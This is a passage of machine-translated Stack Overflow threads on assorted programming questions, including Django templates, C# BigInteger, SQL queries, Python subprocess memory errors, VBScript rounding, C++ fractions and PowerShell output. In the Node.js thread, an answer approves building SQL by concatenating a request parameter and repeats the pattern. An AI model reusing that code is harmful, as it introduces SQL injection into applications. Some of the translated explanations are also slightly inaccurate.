但这行不通。谁能帮我弄清楚为什么？谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-15T22:46:16.053

首先，对于常量键，您不需要自定义过滤器，这可以正常工作：

```
{{ v.key1 }} 
```

也就是说，`data['GROUPS']`是一个 dict，你想迭代它`items`，就像你对`data`.

`data`虽然是一个列表，但不需要：

```
<tbody>
{% for group, data in data.GROUPS.items %} 
<tr>
    <td>{{ group }}</td>
    {% for v in data %}
    <tr>
        <td>{{ v.key1 }}</td>
        <td>{{ v.key2 }}</td>
    </tr>
    {% endfor %}
</tr>
{% endfor %}
</tbody> 
```

# java - 创建 Java 注释以用代码替换标记

> ID：15443234
> 
> 赞同：1
> 
> 时间：2013-03-15T22:40:25.697
> 
> 标签：java, eclipse, macros, annotations

我正在做一个项目，本质上是用户为非常长/重复的代码创建宏的一种方式，这样他们就可以将这些宏放入他们的代码中，以提高可读性并鼓励可重用性。

该项目分为两个区域：一个 RCP 应用程序，用户可以在其中构建宏并将它们保存到文件中，以及 eclipse 中的插件，用户可以在其中插入宏。

RCP 应用程序运行良好，但现在我要实现真正的一点，即我希望 java 查看一段代码并在编译时说“哦，那段代码就是这个意思”。

例如，用户可以创建一个带有`macro1`代表代码的标识符的宏`System.out.println("Hello World");`。他们想在他们的班级中使用它，`foo`如下所示：

```
class foo{

    //lots of java....

    macro1

    //lots more java
} 
```

我希望用户运行他们的类，并在 Java 编译时将其替换`macro1`为它的值。

我已经对此进行了一段时间的研究，并在 JavaCC 上阅读了一些内容并查看了 Ants Replace Task 但我觉得我想继续创建自定义注释以通知 Java 注释下方的这个字符串应该被转换插入/替换为位于特定文本文件中的一段 java 代码。希望以类似的方式结束：

```
@ExpandMacro
macro1 
```

对我来说，这似乎是可能的，但我不知道我是不是太乐观了！:)

我还担心的一个问题是它作为插件的可部署性如何？如果我创建自定义注释，我将如何使其可供用户使用？

任何建议/见解都会非常有帮助！

**编辑：**我还研究了看起来非常有趣的[Project Lombok 。](http://projectlombok.org/)但是由于 lombok 项目所需的设置量，我再次担心可部署性。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-16T19:46:27.490

换个角度看这个。我认为对你来说更好的是使用动态语言（例如groovy）。您可以用 Java 编写代码并使用 Groovy 动态运行它（无需编译）——因为 Java 代码与 groovy 兼容。因此，您可以简单地将 macro1 替换为您需要的内容并运行此代码。使用 groovy 你可以

*   编写代码比看起来像 java
*   用真实代码替换宏
*   在不编译的情况下运行代码

阅读链接：http: [//groovy.codehaus.org/Embedding+Groovy](http://groovy.codehaus.org/Embedding+Groovy) [http://groovy.codehaus.org/Differences+from+Java](http://groovy.codehaus.org/Differences+from+Java)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-15T23:08:19.817

最好的方法是注释处理器（类似于 Lombokg）。使用 JSR 269 Pluggable Annotation Processing API 配置很容易，因为带有处理器的 jar 是自动发现的。

看：[http](http://www.slideshare.net/PolymathicCoder/the-art-of-metaprogramming-in-java) ://www.slideshare.net/PolymathicCoder/the-art-of-metaprogramming-in-java第34页

# c# - 使用 int 作为符号有什么意义？

> ID：15443240
> 
> 赞同：2
> 
> 时间：2013-03-15T22:40:49.193
> 
> 标签：c#, biginteger

因为我需要查看 中的一些方法`BigInteger`，所以我 DotPeeked 进入了程序集。然后我发现了一些相当奇怪的东西：

```
internal int _sign; 
```

为什么要使用 an`int`作为数字的符号？是没有原因，还是我缺少什么。我的意思是，他们可以使用 a`BitArray`或 a`bool`或 a `byte`。为什么一个`int`？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-15T22:52:34.630

如果你看一下`_sign`反编译代码中字段的一些用法，你可能会发现这样的事情：

```
if ((this._sign ^ other._sign) < 0)
    return this._sign >= 0 ? 1 : -1; 
```

基本上`int`类型允许使用乘法比较两个值的符号。显然既不允许`byte`，也`bool`不允许这样做。

仍然有一个问题：为什么不`Int16`这样，因为它会消耗更少的内存？这可能与对齐有关。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-15T22:49:41.423

将符号存储为 int 允许您简单地乘以符号以将其应用于计算结果。这在转换为更简单的类型时会派上用场。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-15T22:50:34.240

一个布尔值只能有 2 个状态。int 的优点是现在跟踪特殊值也很简单：0

```
public bool get_IsZero()
{
    return (this._sign == 0);
} 
```

当您阅读其余代码时，还有更多类似的快捷方式。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-15T23:18:57.463

任何类对象的大小都将四舍五入到 32 位（四个字节），因此“节省”三个字节不会买任何东西。可以通过从保存数值的单词之一中窃取一个位来将典型 BigInteger 的大小减少四个字节，但这种使用所需的额外处理将超过浪费 32 位整数的成本。

一个更有趣的可能性可能是`BigInteger`具有派生类`PositiveBigInteger`和`NegativeBigInteger`. 由于每个类对象都会有一个词来说明它是什么类，因此这种方法将为每个创建的 BigInteger 节省 32 位。以这种方式使用抽象类会为每个函数调用添加一个额外的虚拟成员调度，但可能会为它们中的大多数保存一个“if”测试（因为 eg 的方法`NegativeBigInteger`会根据它们被调用的事实而知道）那`this`是负面的，他们不必测试它）。如果`TinyBigInteger`(a`BigInteger`的值可以放入单个`Integer`) 和`SmallBigInteger`(a`BigInteger`的值可以放入`Long`）。我不知道微软是否考虑过这样的设计，也不知道会有什么取舍。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-15T23:21:05.353

获取一个数字，该数字指示当前 System.Numerics.BigInteger 对象的符号（负数、正数或零）。

-1 此对象的值为负数。0 此对象的值为 0（零）。1 此对象的值为正。

这意味着

```
class Program
{        

    static void Main(string[] args)
    {            
        BigInteger bInt1 = BigInteger.Parse("0");
        BigInteger bInt2 = BigInteger.Parse("-5");
        BigInteger bInt3 = BigInteger.Parse("5");

        division10(bInt1);//it is Impossible
        division10(bInt2);//it is Possible : -2
        division10(bInt3);//it is Possible : 2       
    }

    static void division10(BigInteger bInt)
    {
        double d = 10;  

        if (bInt.IsZero)
        {
            Console.WriteLine("it is Impossible");
        }
        else
        {
            Console.WriteLine("it is Possible : {0}", d / (int)bInt);
        }
    }
} 
```

不要使用 byte 或其他 uint、sbyte、ushort、short 因为存在 CLS 和 CLS 不支持它们

# sql - 在同一个 SQL 查询中匹配多个值

> ID：15443242
> 
> 赞同：3
> 
> 时间：2013-03-15T22:40:57.433
> 
> 标签：sql, sql-server

我有一个具有以下结构的表。

```
Table Name: CustomerStocks

Structure 
Name                     Varchar(25) 
StockSymbol              Varchar(4) 
```

以下是表格内容示例

**名称 股票代码**

```
Sam    AAPL
Sam    AMZN
Sam    GOOG

Judy   AAPL
Judy   AMZN

Jen    AMZN

Brian  GOOG
Brian  MSFT 
```

目标是给定一个客户名称，我如何找出具有类似投资组合的其他客户的列表。换句话说，必须存在原始客户的所有权益。

因此，如果我正在寻找与 Jen 相似的客户，那么结果将是 Judy 和 Sam。

如果我正在搜索具有类似 Judy 投资组合的客户，那么结果将是 Sam。

但是，如果我正在使用 Brian 的投资组合搜索客户，它可以不返回任何行或只返回 Brian。

这可能吗？如果是这样，我该如何编写一个 sql 查询来实现这一点？

任何帮助都非常感谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-15T22:50:12.557

*（稍后稍作调整……）*

我没有测试过这个，但类似......

```
DECLARE @name VARCHAR(24) = 'Judy';

WITH cte_stocks AS (
    SELECT StockSymbol
    FROM CustomerStocks
    WHERE Name = @name
)
SELECT Name
FROM CustomerStocks cs
LEFT JOIN cte_stocks a ON cs.StockSymbol = a.StockSymbol
GROUP BY cs.Name
HAVING COUNT(DISTINCT a.StockSymbol) = (SELECT COUNT(1) FROM cte_stocks) 
```

……可能会

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-15T22:44:25.377

这应该有效：

```
declare @Name varchar(25) = 'Judy'

select * from CustomerStocks cs
where cs.StockSymbol in 
    (select x.StockSymbol 
     from CustomerStocks x 
     where x.Name = @Name) 
```

或者排除 Judy：

```
declare @Name varchar(25) = 'Judy'

select * from CustomerStocks cs
where cs.StockSymbol in 
    (select x.StockSymbol 
     from CustomerStocks x 
     where x.Name = @Name
     and x.Name <> cs.Name) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-15T22:56:15.910

好的，那么这个怎么样：

```
declare @Name Varchar(25) = 'Judy'
declare @table (StockSymbol varchar(4))

--Get StockSymbols to search for
insert into @table
select cs.StockSymbol 
from CustomerStocks cs 
where cs.Name = @Name
group by cs.StockSymbol

--Match against the people
select cs.Name from CustomerStocks cs
where (select count(*) 
     from CustomerStocks x 
     inner join @table t on x.StockSymbol = t.StockSymbol
     where x.Name = cs.Name
     group by x.StockSymbol) = (select count(*) from @table t)
group by cs.Name 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-15T23:21:07.137

像这样的东西可能会起作用，独立于引擎：

```
SELECT target.Name, 'similar_to', others.Name
FROM (
  SELECT Name, COUNT(*) numStocks
  FROM CustomerStocks
  GROUP BY Name
) target
  INNER JOIN (
    SELECT cs1.Name match, cs2.Name otherName, count(*) commonStocks
    FROM CustomerStocks cs1
      INNER JOIN CustomerStocks cs2
        ON cs1.StockSymbol = cs2.StockSymbol
          AND cs1.Name <> cs2.Name
    GROUP BY cs1.Name, cs2.Name
  ) others ON target.Name = others.match
      AND others.commonStocks >= numStocks.numStocks 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-16T08:58:04.757

带有[NOT EXISTS()](http://msdn.microsoft.com/en-us/library/ms188336.aspx)和[EXCEPT](http://msdn.microsoft.com/ru-ru/library/ms188055.aspx)运算符的选项

```
DECLARE @Name Varchar(25) = 'Judy'       
SELECT *
FROM dbo.CustomerStocks s
WHERE NOT EXISTS (
                  SELECT s3.StockSymbol
                  FROM dbo.CustomerStocks s3
                  WHERE s3.Name = @Name
                  EXCEPT
                  SELECT s2.StockSymbol
                  FROM dbo.CustomerStocks s2
                  WHERE s2.Name = s.Name                        
                  ) AND s.Name != @Name 
```

为了提高性能，请使用此索引

```
CREATE INDEX ix_StockSymbol_CustomerStocks ON CustomerStocks(StockSymbol) INCLUDE(Name) 
```

[**SQLFiddle**](http://sqlfiddle.com/#!3/476a0/1)上的演示[](http://sqlfiddle.com/#!3/476a0/1)

# python - 了解 Python fork 和内存分配错误

> ID：15443246
> 
> 赞同：9
> 
> 时间：2013-03-15T22:41:12.537
> 
> 标签：python, linux, fork

我有一个内存密集型 Python 应用程序（几百 MB 到几 GB 之间）。
我有几个非常小的 Linux 可执行文件，主要应用程序需要运行，例如

```
child = Popen("make html", cwd = r'../../docs', stdout = PIPE, shell = True)
child.wait() 
```

当我运行这些外部实用程序（一次，在长时间的主进程运行结束时）时，`subprocess.Popen`有时会得到`OSError: [Errno 12] Cannot allocate memory`.
我不明白为什么......请求的过程很小！
系统有足够的内存容纳更多的 shell。

我使用的是 Linux（Ubuntu 12.10，64 位），所以我猜子进程调用 Fork。
Fork 分叉了我现有的进程，从而使消耗的内存量增加了一倍，并且失败了？？
“写时复制”发生了什么？

我可以在没有 fork 的情况下生成一个新进程（或者至少不复制内存 - 从新开始）？

有关的：

[fork()、vfork()、exec()和clone()的区别](https://stackoverflow.com/questions/4856255/the-difference-between-fork-vfork-exec-and-clone)

[fork() & 内存分配行为](https://stackoverflow.com/questions/12924048/fork-memory-allocation-behavior)

[Python subprocess.Popen 出现 OSError 错误：[Errno 12] 一段时间后无法分配内存](https://stackoverflow.com/questions/1216794/python-subprocess-popen-erroring-with-oserror-errno-12-cannot-allocate-memory)

[使用 subprocess.Popen 的 Python 内存分配错误](https://stackoverflow.com/questions/5306075/python-memory-allocation-error-using-subprocess-popen)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-07-04T00:43:46.327

似乎不会出现真正的解决方案（即使用 vfork 的子进程的替代实现）。那么可爱的黑客怎么样？在你的进程开始时，生成一个内存占用很小的从属进程，准备好生成你的子进程，并在主进程的整个生命周期中保持与它的开放通信。

这是一个使用 rfoo ( [http://code.google.com/p/rfoo/](http://code.google.com/p/rfoo/) ) 和一个名为 rfoosocket 的命名 unix 套接字的示例（您显然可以使用 rfoo 支持的其他连接类型，或其他 RPC 库）：

服务器：

```
import rfoo
import subprocess

class MyHandler(rfoo.BaseHandler):
    def RPopen(self, cmd):
        c = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
        c.wait()
        return c.stdout.read()

rfoo.UnixServer(MyHandler).start('rfoosocket') 
```

客户：

```
import rfoo

# Waste a bunch of memory before spawning the child. Swap out the RPC below
# for a straight popen to show it otherwise fails. Tweak to suit your
# available system memory.
mem = [x for x in range(100000000)]

c = rfoo.UnixConnection().connect('rfoosocket')

print rfoo.Proxy(c).RPopen('ls -l') 
```

如果您需要与生成的子进程进行实时的来回协同进程交互，此模型可能不起作用，但您可能能够破解它。您可能想要清理可以传递给 Popen 的可用参数根据您的特定需求，但这都应该相对简单。

您还应该发现在客户端启动时启动服务器并管理要在退出时清理的套接字文件（或端口）很简单。

# vbscript - 不能四舍五入

> ID：15443249
> 
> 赞同：1
> 
> 时间：2013-03-15T22:41:20.463
> 
> 标签：vbscript, rounding

我有以下代码：

```
Dim a as Long
a = InputBox("a=")
Dim nr_cifre as Long
nr_cifre = 0
Dim n as Long
n=a
Do While n <> 0
    n=n / 10
    nr_cifre = nr_cifre + 1
Loop
If a - a mod (10 * nr_cifre) = 0.5 Then
    a=a+0.9+(nr_cifre*10)
End If
MsgBox a mod (10 * nr_cifre) 
```

基本上，它会尝试对数字进行四舍五入。因此，2.3 将变为 2。此外，它会尝试四舍五入，例如 2.5 到 3。

该示例适用于小数字，例如 1234,5。但是，如果我尝试对 12345,6 进行四舍五入，则会出现一些奇怪的错误。我也尝试过 VB6 中的代码，但没有成功。

我可以寻求您的帮助/建议吗？任何提示都受到高度赞赏。提前致谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-15T23:14:34.967

如果您需要自己的算法，请尝试以下操作：

```
WSH.Echo CustomRound(-123456.7) '-123457
WSH.Echo CustomRound(-123456.5) '-123456
WSH.Echo CustomRound(-123456.3) '-123456
WSH.Echo CustomRound(123456.7)  '123457
WSH.Echo CustomRound(123456.5)  '123457
WSH.Echo CustomRound(123456.3)  '123456

Function CustomRound(nValue)
    CustomRound = Int(nValue + 0.5)
End Function 
```

或者...

```
WSH.Echo CustomRound2(-123456.7) '-123457
WSH.Echo CustomRound2(-123456.5) '-123457
WSH.Echo CustomRound2(-123456.3) '-123456
WSH.Echo CustomRound2(123456.7)  '123457
WSH.Echo CustomRound2(123456.5)  '123457
WSH.Echo CustomRound2(123456.3)  '123456

Function CustomRound2(nValue)
    CustomRound2 = Sgn(nValue) * Int(Abs(nValue) + 0.5)
End Function 
```

嗯......还有一个想法:)

```
Function RoundFrm(nValue)
    RoundFrm = Null
    If IsEmpty(nValue) Or _
    Not IsNumeric(nValue) Then Exit Function
    RoundFrm = FormatNumber(nValue, 0)
End Function 
```

并且使用上面的想法可以使功能更完整，例如...

```
Function RoundEx(nValue)
    Select Case VarType(nValue)
        Case vbInteger, vbLong
            RoundEx = nValue
        Case vbSingle
            RoundEx = CSng(FormatNumber(nValue, 0))
        Case vbDouble
            RoundEx = CDbl(FormatNumber(nValue, 0))
        Case vbCurrency
            RoundEx = CCur(FormatNumber(nValue, 0))
        Case Else: RoundEx = Null
    End Select
End Function 
```

# php - Joomla ACL 和替代页面内容

> ID：15443259
> 
> 赞同：0
> 
> 时间：2013-03-15T22:42:29.797
> 
> 标签：php, joomla, joomla2.5, acl, joomla-extensions

我们有一个网站，我们打算在其中销售视频教程的访问权限。我已经设置了 Joomla ACL，将这些页面的访问权限限制在那些已获得相关访问权限的用户，并且访问权限正在通过名为 MijoShop 的购物车出售。

目前此设置运行良好，但用户体验存在一些问题。目前，我似乎只能阻止人们查看页面，但我看不到使用 Joomla ACL 向他们展示替代内容的简单方法。理想情况下，如果登录用户无权访问某个视频教程页面，当他们单击该页面的链接时，他们将看到一个页面，让他们有机会购买该教程的访问权限。这意味着我需要一种在同一页面上显示不同内容的方法，具体取决于用户分配到的 Joomla 用户组。香草 Joomla ACL 是否可以做到这一点，还是我必须找到一个可以添加执行此功能的内容管理扩展？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-18T14:14:48.517

您应该能够使用 Vanilla ACL 做到这一点。IIRC，您可以设置各种组以访问不同的教程/页面/事物-然后您可以使成员成为多个组的一部分-从而使他们可以根据需要访问这些事物。

如果不能做这样的事情 - 那么我认为 George Wilsons 的评论就足够了一段时间，你可以在文章的代码中实现一些 if/then/else 类型的语句，这将起作用。

但是，您最好的选择是首先尝试 ACL 解决方案，因为从后端的角度来看，这可以让您通常更容易管理事情。

# android - 比较 HttpStatus.SC_OK 和 INT 变量

> ID：15443262
> 
> 赞同：0
> 
> 时间：2013-03-15T22:42:39.597
> 
> 标签：android, apache-httpcomponents

我做了一个方法来检查http服务器是否响应正常。我正在使用 apache 组件。

```
private static int CheckAvailabilityHttp(String pHostName, int pPort)
{
    try {
        HttpClient httpClient = new DefaultHttpClient();
        HttpGet httpGet = new HttpGet(String.format("http://%s:%s",pHostName,pPort));
        HttpResponse response = httpClient.execute(httpGet);
        int status = response.getStatusLine().getStatusCode();
        if (HttpStatus.SC_OK == status) { // HttpStatus.SC_OK is 200 and status is 200
            return ServerStatuses.SUCCESS;
        }   
    } catch (MalformedURLException e1) {
        e1.printStackTrace();
    } catch (IOException e) {
        e.printStackTrace();
    }

    return ServerStatuses.FAILED;
} 
```

问题出在比较线上：

```
if (HttpStatus.SC_OK == status) 
```

即使 BOTH（HttpStatus.SC_OK 和状态变量）都是 200，它也不会进入条件范围内......它甚至不会引发异常。

我做错了什么？？

感谢您的时间！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-10-02T11:10:21.497

获取 HTTP 响应的状态码。

```
final int statusCode = getResponse.getStatusLine().getStatusCode();
if (statusCode != HttpStatus.SC_OK) { 
    Log.w(getClass().getSimpleName(), "Error " + statusCode + " for URL " + url); 
    return null;
} 
```

告诉我这是否有帮助:)

# c++ - 如何完全减少/简化分数（C++）

> ID：15443266
> 
> 赞同：0
> 
> 时间：2013-03-15T22:42:58.910
> 
> 标签：c++, class, struct, fractions

我一生都无法理解**为什么**当我在代码中输入正常分数时会返回无限值。除了 GCD（最大公约数）之外的所有东西似乎都在工作。

这其中是否存在明显的逻辑错误？

我已经完成了我的研究并找到了这个问题的各种答案，我的意思是维基百科甚至给你代码来做这件事，但我想弄清楚如何让它按照我现在编码的方式工作.

```
#include <iostream>
#include <stdlib.h>
#include <cmath>
#include <math.h>

using namespace std;

class Fraction
{
private:
   double num;
   double den;
   double fraction;
   double temp;
public:
   void setNum();
   void setDen();
   int getNum();
   int getDen();
   void lcdOutput();
   void decOutput();
   int gcd();
};

void Fraction::setNum(){
   cout << "Enter a value for your numerator: " << endl;
   cin >> num;
}

void Fraction::setDen(){
    cout << "Enter a value for your denominator: " << endl;
    cin >> den;
}

int Fraction::getNum(){
    return num;
 }

 int Fraction::getDen(){
     return den;
  }

int Fraction::gcd(){

    Fraction set;
    if(num > den){
       if(fmod(num, den) == 0){
          den = temp;
          return temp;
       }
       else{
          den = fmod(num, den);
          set.gcd();
       }
    }
    else{
       if(fmod(den, num) == 0){
          num = temp;
          return temp;
       }
       else{
          num = fmod(den, num);
          set.gcd();
       }
    }
 }

void Fraction::lcdOutput(){
    Fraction set;
    set.gcd();
    num = num / temp;
    den = den / temp;
    cout << "Fraction in lowest terms: " << num << "/" << den << endl;
}

void Fraction::decOutput(){
   double decimal = num / den;
   cout.precision(4);
   cout << "The fraction in decimal form is: " << decimal << endl;
}

int main(){

    Fraction set;

    set.setNum();
    set.setDen();
    set.getNum();
    set.getDen();
    set.lcdOutput();
    set.decOutput();

return 0;
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-15T22:59:31.117

这就是我可以通过单步执行您的代码来确定的内容。

从 main 开始，您实例化一个`Fraction`名为的类型的实例`set`。您通过调用`set.setNum()`和分配其分子和分母`set.setDen()`。在这种情况下，调用`getNum()`和`getDen()`什么都不做，因为它们没有被分配给任何东西。

然后你打电话`lcdOutput()`，让我们开始逐步完成。您首先实例化 Fraction 的 LOCAL 实例（不知道为什么要这样做，在我看来这可能是一个概念错误），然后调用`set.gcd()`该本地实例。调用`set.gcd()`将调用该实例的方法，在我看来，您真正想要的是`this->gcd()`或只是`gcd()`.

`num = num / temp`您通过设置和进行跟进`den = den / temp`，但`temp`此时仍未初始化。如果变量未初始化，它可以（并且通常是）指向`garbage`. 这可能解释了为什么您会返回无意义的值。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-15T23:23:35.740

我回去自己想通了。我看到了一些评论，并注意到我非常大的概念和逻辑错误。这是给任何有同样问题的人！

```
int gcd(double num, double den){
    if(den == 0){
       return num;
    }
return gcd(den, fmod(num, den));
}

void Fraction::lcdOutput(){
    double temp = gcd(num, den);
    cout << "Fraction in lowest terms: " << num / temp << "/" << den / temp << endl;
} 
```

# html - 改变 innerHTML() 方法？

> ID：15443267
> 
> 赞同：0
> 
> 时间：2013-03-15T22:42:58.867
> 
> 标签：html, television

有没有办法改变底层函数，`innerHTML()`所以自定义函数将负责向 DOM 添加东西？有没有办法改变的原型功能`innerHTML()`？

我问的原因是因为三星电视不喜欢什么时候`innerHTML()`使用。相反，三星建议使用他们自己的 API 来写入 DOM。但是，如果我的应用程序的代码库可以在其他非三星平台上使用，那就太好了。因此，如果我可以更改`innerHTML()`一个 JS 文件的工作方式，使其使用 Samsung 函数，而不是在整个代码中创建条件语句，那将是理想的选择。另外，由于我使用的是 jquery，如果我可以`innerHTML()`直接影响会很好，因为 jquery 也使用`innerHTML()`.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-16T01:03:22.987

考虑使用这个。它以更标准的方式将元素添加到 DOM，但仍允许您编写 HTML 代码以添加到 DOM。

[http://www.optimalworks.net/resources/betterinnerhtml/](http://www.optimalworks.net/resources/betterinnerhtml/)

# android - 如何在 ui-thread 上注入并等待注入完成后再继续？

> ID：15443268
> 
> 赞同：2
> 
> 时间：2013-03-15T22:43:20.653
> 
> 标签：android, junit, dependency-injection, dagger

在 Dagger 中，您必须在 UI 线程上注入。运行 JUnit 时，您并未在 UI 线程上运行。为了让它工作，我们必须在 UI 线程上发布一个 Runnable 并等待它完成注入。

我的代码如下所示：

```
 public void inject(final Object object) {
        // We always has to inject on the main thread.
        final CountDownLatch latch = new CountDownLatch(1);
        Handler mainHandler = new Handler(FodoApplication.getAppContext().getMainLooper());
        Runnable myRunnable = new Runnable() {
            public void run() {
                objectGraph.inject(object);
            latch.countDown();
            }
        };
        mainHandler.post(myRunnable);
        try {
            latch.await();
        } catch (InterruptedException e) {
            Log.e(TAG, "", e);
        }
    } 
```

问题是调用latch.await() 时myRunnable 没有启动。运行 JUnit 时让 Dagger 注入的最佳方法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-16T03:46:15.327

您可以从 AndroidTestCase 使用此方法：http: [//developer.android.com/reference/android/app/Instrumentation.html#runOnMainSync(java.lang.Runnable)](http://developer.android.com/reference/android/app/Instrumentation.html#runOnMainSync(java.lang.Runnable))

这一个也很有用：http: [//developer.android.com/reference/android/test/InstrumentationTestCase.html#runTestOnUiThread(java.lang.Runnable)](http://developer.android.com/reference/android/test/InstrumentationTestCase.html#runTestOnUiThread(java.lang.Runnable))

# javascript - 如何执行条件 SQL 查询，将结果打包为 JSON，并发送回客户端？

> ID：15443270
> 
> 赞同：1
> 
> 时间：2013-03-15T22:43:29.643
> 
> 标签：javascript, node.js, sqlite

我在前端使用 node.js、sqlite3（带有 anyDB）和 javascript。

我做了一张桌子：

```
conn.query('CREATE TABLE messages (id INTEGER PRIMARY KEY AUTOINCREMENT, room TEXT, nickname TEXT, body TEXT, time INTEGER)').on('end', function(){
        console.log('Made table!');
    }); 
```

我在表格中插入了一些东西：

```
conn.query('INSERT INTO messages VALUES ($1, $2, $3, $4, $5)', [null, request.params.roomName, request.body.nickname, request.body.message, null]).on('error', console.error); 
```

在客户端js中，我写了这段代码：

```
window.addEventListener('load', function(){
     var intervalID = setInterval(updateMessages, 4000);
}, false);

function updateMessages() {
    var req = new XMLHttpRequest();
    req.open('GET', '/' + roomName + '/messages.json', true);
    req.send();
    //GET ACCESS TO RESPONSE IN ORDER TO ADD IT TO THE PAGE
} 
```

在服务器端，我写了这段代码：

```
app.get('/:roomName/messages.json', function(request, response){
    var roomName = request.params.roomName;
    var messages = conn.query("SELECT ALL body FROM messages where room="+roomName+";");
    response.send(messages);
}); 
```

我的 SQL 语句看起来正确吗？如果房间还没有在数据库中，我该如何编写 select 语句，以便它不会使服务器崩溃？

最后，我如何打包我的响应并将其发送回公共 js 文件，然后发送到页面？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-15T23:07:11.947

> 我的 SQL 语句看起来正确吗？

是的。

> 如果房间还没有在数据库中，我该如何编写 select 语句，以便它不会使服务器崩溃？

你需要做一些错误处理。尝试使用类似这样的回调：

```
var sql = "SELECT ALL body FROM messages where room="+roomName+";";
conn.query(sql, function(error, result) { 
  if(error) {
    console.log("There was an error.");
  }
  response.send(result);
}); 
```

> 最后，我如何打包我的响应并将其发送回公共 js 文件，然后发送到页面？

您正在发送从 SQL 查询返回的对象。您的客户需要期待该对象。我建议看看[如何](http://www.w3schools.com/ajax/default.asp)从客户端发送和接收 AJAX 请求。您不会“更新公共 js”，而是发送消息，您的客户会期望收到它。

# c++ - 在一个时间间隔内随机调度 n 个不重叠的事件

> ID：15443271
> 
> 赞同：1
> 
> 时间：2013-03-15T22:43:44.093
> 
> 标签：c++, algorithm, statistics, scheduling

如果这是具有众所周知的解决方案的知名问题，请原谅我。我一直在寻找，但显然没有成功。

假设我有*n 个*事件必须在一个区间内发生（例如，[0,1]）。每个事件都与从预定义分布中随机抽取的持续时间相关联。假设间隔远大于所有事件持续时间的总和：有效的时间表总是存在的。[0,1]区间内事件发生的概率不均匀，但只要不重叠，事件就是独立的。

安排这些事件的有效和准确（随机）方式是什么？

这是我当前的伪代码：

```
lowerBound = min(interval)
上界 = 最大值（间隔）
对于 n in numEvents {
  绘制开始时间
  绘制结束时间
  while ( startTime 小于 lowerBound || endTime 超过 upperBound ) {
    绘制开始时间
    绘制结束时间
  }
  添加事件
  重置 lowerBound 和 upperBound 以定义最大剩余（无事件）间隔
}

```

我认为，通过选择更大的剩余间隔来安排新事件，我会让事件过度分散——比其他情况下的间隔更大。尽管如此，当事件数量很少时，这似乎非常有效并且可能非常准确。

我正在使用 C++，尽管这可能无关紧要。

如果您知道这种问题的名称，我也非常感谢搜索词。

* * *

背景：在这里，准确性对我来说是最重要的。这不是整个程序中耗时的步骤。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-15T23:25:42.407

我只是随机放置每个事件，检查碰撞，如果有碰撞擦干净并重新开始。

你说间隔远大于事件持续时间的总和，所以碰撞会很少，所以这种方法在实践中是相当快的。

你说你想要*准确*的结果。我不确定这意味着什么，但我猜我会说所有有效的解决方案都应该是同样可能的；该问题中的当前解决方案不满足该要求，但是这个解决方案可以。

# powershell - 在 PowerShell 中对齐 Select-String 的输出

> ID：15443277
> 
> 赞同：3
> 
> 时间：2013-03-15T22:44:24.163
> 
> 标签：powershell

当我使用时，`select-string`我几乎总是希望我的输出对齐，即文件名、行号和找到的文本都应该对齐到列中。从视觉上看，它不会分散注意力，并且通常可以更容易地发现差异。作为一个简单的例子，我在中间文件中注入了一个额外的空间：

```
PS> Get-ChildItem *.cs | Select-StringAligned -pattern override
---
FileWithQuiteALengthyName.cs  : 34:    protected override void Foo()
ShortName.cs                  : 46:    protected override void  Bar()
MediumNameFileHere.cs         :123:    protected override void Baz()
--- 
```

不幸的是，`Select-String`没有这样做；实际上它给出了这个——你能发现这里的额外空间吗？

```
PS> Get-ChildItem *.cs | Select-String -pattern override
---
FileWithQuiteALengthyName.cs:34:    protected override void Foo()
ShortName.cs:46:    protected override void  Bar()
MediumNameFileHere.cs:123:    protected override void Baz()
--- 
```

有没有办法强制`Select-String`对齐其输出列？

编辑：哎呀！我忘记了一个重要部分：如果可能的话，我还想包含该`-Context`参数，以便可以在比赛前后获得任意数量的行。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-16T02:17:46.333

使用对象：

```
Get-ChildItem *.cs | select-string -pattern override |
select Filename,LineNumber,Line | Format-Table -AutoSize 
```

如果您决定要保留它，它也适合导出到 csv。

添加该要求以使其也能够使用上下文会使事情变得相当复杂。

```
function ssalign {
begin {$display = @()}
process {
 $_  -split "`n" |
 foreach {
   $display += 
   $_ | New-PSObjectFromMatches -Pattern '^(.+)?:([\d]+):(.+)' -Property $null,File,Line,Text 
  } 
}
end {
$display | 
 foreach {$_.line = ':{0,5}:' -f $_.line}
 $display | ft -AutoSize -HideTableHeaders
 }
}

Get-ChildItem *.cs | Select-StringAligned -pattern override | ssalign 
```

在此处获取 New-PSObjectFromMatches 函数：http: [//gallery.technet.microsoft.com/scriptcenter/New-PSObjectFromMatches-87d8ce87](http://gallery.technet.microsoft.com/scriptcenter/New-PSObjectFromMatches-87d8ce87)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-15T22:49:52.497

这可能是：

```
Get-ChildItem *.cs | select-string -pattern override | ft filename, linenumber , line -AutoSize 
```

或类似的东西：

```
Get-ChildItem *.cs | select-string -pattern override |
 % { "{0,-20}{1,15}{2,70}" -f $_.filename, $_.linenumber , $_.line } 
```

`-f`必须根据匹配的长度检查字符串格式第一部分中的值（“{0,-20}{1,15}{2,70}”）

* * *

## 回答 #3

